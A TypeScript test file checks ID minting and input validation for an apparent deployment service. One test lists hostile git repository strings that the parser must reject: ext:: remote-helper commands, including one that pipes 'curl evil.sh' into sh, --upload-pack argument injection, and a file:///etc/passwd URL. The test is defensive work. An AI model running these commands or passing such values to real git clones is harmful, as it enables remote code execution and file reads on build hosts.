import test from 'node:test'
import assert from 'node:assert/strict'
import {
    firstLabel,
    newDeploymentId,
    newProjectId,
    parseCommitSha,
    parseDeploymentId,
    parseHostname,
    parseProjectId,
    parseRepoUrl,
} from '#shared/ids.ts'

test('a minted project id parses back and a deployment id does not', () => {
    const id = newProjectId()
    assert.match(id, /^prj_[0-9a-f]{12}$/)
    assert.equal(parseProjectId(id), id)
    assert.equal(parseDeploymentId(id), null)
})

test('a minted deployment id parses back and a project id does not', () => {
    const id = newDeploymentId()
    assert.match(id, /^dpl_[0-9a-f]{12}$/)
    assert.equal(parseDeploymentId(id), id)
    assert.equal(parseProjectId(id), null)
})

test('minted ids do not collide', () => {
    const minted = new Set(Array.from({ length: 500 }, () => newDeploymentId()))
    assert.equal(minted.size, 500)
})

test('parseCommitSha takes forty lowercase hex characters and nothing else', () => {
    const sha = 'a'.repeat(40)
    assert.equal(parseCommitSha(sha), sha)
    for (const bad of ['a'.repeat(39), 'a'.repeat(41), 'A'.repeat(40), `${'a'.repeat(39)}g`, '']) {
        assert.equal(parseCommitSha(bad), null, `should reject ${JSON.stringify(bad)}`)
    }
})

test('parseRepoUrl accepts an https repository url', () => {
    const url = 'https://github.com/octocat/blog'
    assert.equal(parseRepoUrl(url), url)
    assert.equal(parseRepoUrl('https://github.com/octocat/blog.git'), 'https://github.com/octocat/blog.git')
})

// The worker clones on the host, outside the container, and git's remote-helper syntax
// runs a shell command on whichever machine does the clone. This is that boundary.
test('parseRepoUrl rejects everything git would treat as more than a url', () => {
    const attacks = [
        'ext::sh -c whoami',
        'ext::sh -c "curl evil.sh | sh"',
        'git@github.com:octocat/blog',
        '-uupload-pack=touch /tmp/pwned',
        '--upload-pack=touch /tmp/pwned',
        'ssh://git@github.com/octocat/blog',
        'git://github.com/octocat/blog',
        'file:///etc/passwd',
        'http://github.com/octocat/blog',
        'https://user:token@github.com/octocat/blog',
        'https://token@github.com/octocat/blog',
        'https://',
        '',
    ]
    for (const attack of attacks) {
        assert.equal(parseRepoUrl(attack), null, `should reject ${JSON.stringify(attack)}`)
    }
})

test('parseRepoUrl returns a canonical url, never the raw input', () => {
    for (const padded of ['  https://github.com/o/r', 'https://github.com/o/r\n', 'https://git\nhub.com/o/r', 'https://git\thub.com/o/r']) {
        const parsed = parseRepoUrl(padded)
        assert.equal(parsed, 'https://github.com/o/r', `should canonicalise ${JSON.stringify(padded)}`)
    }
})

test('parseHostname canonicalises to lowercase', () => {
    assert.equal(parseHostname('MyApp.localhost'), 'myapp.localhost')
    assert.equal(parseHostname('DPL_0123456789AB.LOCALHOST'), 'dpl_0123456789ab.localhost')
})

// Every deployment is promised a URL at <id>.localhost, and a deployment id contains an
// underscore. If this rejects, every direct deployment URL 404s.
test('parseHostname accepts the url every deployment is promised', () => {
    const id = newDeploymentId()
    const hostname = parseHostname(`${id}.localhost`)
    assert.equal(hostname, `${id}.localhost`)
    assert.notEqual(hostname, null)
    if (hostname !== null) assert.equal(parseDeploymentId(firstLabel(hostname)), id)
})

test('parseHostname rejects what is not a hostname', () => {
    for (const bad of ['', '.', 'a..b', '-lead.localhost', 'trail-.localhost', 'a b', 'a/b', `${'a'.repeat(254)}`]) {
        assert.equal(parseHostname(bad), null, `should reject ${JSON.stringify(bad)}`)
    }
})

test('firstLabel is the segment before the first dot', () => {
    const dotted = parseHostname('dpl-abc.localhost')
    assert.notEqual(dotted, null)
    if (dotted !== null) assert.equal(firstLabel(dotted), 'dpl-abc')

    const bare = parseHostname('localhost')
    assert.notEqual(bare, null)
    if (bare !== null) assert.equal(firstLabel(bare), 'localhost')
})
